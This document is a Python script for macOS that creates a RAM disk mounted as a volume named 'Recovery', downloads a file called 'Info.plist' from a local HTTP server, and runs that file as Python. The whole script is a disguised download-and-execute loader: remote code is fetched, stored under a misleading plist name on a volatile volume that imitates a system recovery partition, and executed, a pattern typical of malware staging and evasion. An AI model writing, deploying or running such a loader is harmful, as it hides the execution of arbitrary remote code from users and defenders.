import sys

sys.dont_write_bytecode = True

import argparse
import os
import re
import subprocess
import time
import urllib.request
from pathlib import Path


VOLUME_NAME = "Recovery"
MOUNT_POINT = Path("/Volumes") / VOLUME_NAME

WASSUP_FILENAME = "Info.plist"
WASSUP_URL = f"http://127.0.0.1:8000/{WASSUP_FILENAME}"

SECTOR_SIZE = 512
MAX_DOWNLOAD_BYTES = 16 * 1024 * 1024


def run(*args):
    return subprocess.run(
        args,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def create_ram_device(size):
    sectors = size * 1024 * 1024 // SECTOR_SIZE
    result = run("hdiutil", "attach", "-nomount", f"ram://{sectors}")
    match = re.search(r"(?m)^(/dev/disk\d+)\b", result.stdout)
    if not match:
        raise RuntimeError(f"Could not identify RAM device from hdiutil output: {result.stdout!r}")
    return match.group(1)


def format_and_mount(device):
    run("diskutil", "eraseVolume", "HFS+", VOLUME_NAME, device)
    for _ in range(50):
        if MOUNT_POINT.is_mount():
            return
        time.sleep(0.1)
    raise RuntimeError(f"Volume was formatted but did not mount at {MOUNT_POINT}")


def download(url, destination):
    partial = destination.with_name(f".{destination.name}.partial")
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    request = urllib.request.Request(
        url,
        headers={"User-Agent": "DSK"},
    )

    total = 0
    try:
        with opener.open(request, timeout=10) as response, partial.open("wb") as output:
            while chunk := response.read(64 * 1024):
                total += len(chunk)
                if total > MAX_DOWNLOAD_BYTES:
                    raise RuntimeError(f"{destination} exceeds the 16 MiB safety limit.")
                output.write(chunk)

        os.chmod(partial, 0o644)
        os.replace(partial, destination)
    finally:
        partial.unlink(missing_ok=True)


def detach(device):
    subprocess.run(
        ("hdiutil", "detach", device),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )


def parse_args():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--size",
        type=int,
        default=2,
        help="RAM disk capacity in MiB (default: 2)",
    )
    args = parser.parse_args()
    if not 2 <= args.size <= 4096:
        parser.error("--size must be between 2 and 4096 Mib")
    return args


def main():
    args = parse_args()

    if sys.platform != "darwin":
        print("This script requires macOS.", file=sys.stderr)
        return 1
    if MOUNT_POINT.exists():
        print(f"Refusing to continue: {MOUNT_POINT} already exists.", file=sys.stderr)
        return 1

    device = None
    try:
        device = create_ram_device(args.size)
        format_and_mount(device)
        destination = MOUNT_POINT / WASSUP_FILENAME
        download(WASSUP_URL, destination)
        run("python3", "-B", str(destination))
    except Exception as exc:
        print(f"Error: {exc}", file=sys.stderr)
        if device is not None:
            detach(device)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
